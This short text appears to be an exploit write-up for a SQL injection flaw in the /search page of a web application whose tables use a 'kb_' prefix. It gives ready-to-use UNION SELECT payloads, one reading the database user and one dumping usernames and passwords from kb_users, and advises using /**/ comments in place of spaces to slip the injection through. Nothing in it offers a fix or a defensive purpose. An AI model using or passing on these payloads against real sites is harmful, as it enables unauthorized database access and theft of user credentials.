Go to /search
and search for: %')/**/UNION/**/ALL/**/SELECT/**/1,2,user(),4,5,6,7,8,9,10,11,12,13,14,15#
Don't use spaces in the injection because they change the sql query in a way which makes the injection nearly impossible; instead use /**/.
Here is an example how to select usernames and password if the default prefix of kb_ is used during the installation:
search for: %')/**/UNION/**/ALL/**/SELECT/**/1,2,concat(username,0x3a,password),4,5,6,7,8,9,10,11,12,13,14,15/**/from/**/kb_users#
